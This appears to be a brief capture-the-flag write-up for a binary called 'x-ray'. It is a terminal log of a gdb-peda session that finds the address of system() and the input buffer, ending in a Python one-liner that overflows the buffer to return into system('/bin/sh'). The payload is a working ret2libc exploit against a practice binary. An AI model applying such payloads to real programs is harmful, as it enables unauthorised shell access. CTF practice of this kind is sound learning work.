# x-ray
```bash=
$ gdb -q ./x-ray
Reading symbols from ./x-ray...(no debugging symbols found)...done.
gdb-peda$ b main
Breakpoint 1 at 0x8048518
gdb-peda$ r
Starting program: /home/task4233/work/ctf/make/x-ray/x-ray 

[----------------------------------registers-----------------------------------]
EAX: 0xf7fb2dd8 --> 0xffffd0ec --> 0xffffd2e2 ("CLUTTER_IM_MODULE=xim")
EBX: 0x0 
ECX: 0xffffd050 --> 0x1 
EDX: 0xffffd074 --> 0x0 
ESI: 0xf7fb1000 --> 0x1d7d6c 
EDI: 0x0 
EBP: 0xffffd038 --> 0x0 
ESP: 0xffffd034 --> 0xffffd050 --> 0x1 
EIP: 0x8048518 (<main+14>:	sub    esp,0x4)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048514 <main+10>:	push   ebp
   0x8048515 <main+11>:	mov    ebp,esp
   0x8048517 <main+13>:	push   ecx
=> 0x8048518 <main+14>:	sub    esp,0x4
   0x804851b <main+17>:	call   0x8048538 <__x86.get_pc_thunk.ax>
   0x8048520 <main+22>:	add    eax,0x1ae0
   0x8048525 <main+27>:	call   0x80484a6 <func>
   0x804852a <main+32>:	mov    eax,0x0
[------------------------------------stack-------------------------------------]
0000| 0xffffd034 --> 0xffffd050 --> 0x1 
0004| 0xffffd038 --> 0x0 
0008| 0xffffd03c --> 0xf7df1e81 (<__libc_start_main+241>:	add    esp,0x10)
0012| 0xffffd040 --> 0xf7fb1000 --> 0x1d7d6c 
0016| 0xffffd044 --> 0xf7fb1000 --> 0x1d7d6c 
0020| 0xffffd048 --> 0x0 
0024| 0xffffd04c --> 0xf7df1e81 (<__libc_start_main+241>:	add    esp,0x10)
0028| 0xffffd050 --> 0x1 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048518 in main ()
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xf7e16200 <system>
gdb-peda$ q
task4233@task4233-VirtualBox:~/work/ctf/make/x-ray
$ objdump -d -M intel ./x-ray | grep func
080484a6 <func>:
 8048525:	e8 7c ff ff ff       	call   80484a6 <func>
task4233@task4233-VirtualBox:~/work/ctf/make/x-ray
$ ./x-ray
buf address: 0x804a060
^C
task4233@task4233-VirtualBox:~/work/ctf/make/x-ray
$ (python -c 'import sys;sys.stdout.buffer.write(b"/bin/sh" + b"\x00" + b"A"*36 + b"\x00\x62\xe1\xf7" + b"\x25\x85\x04\x08" + b"\x60\xa0\x04\x08\n")'; cat) | ./x-ray
```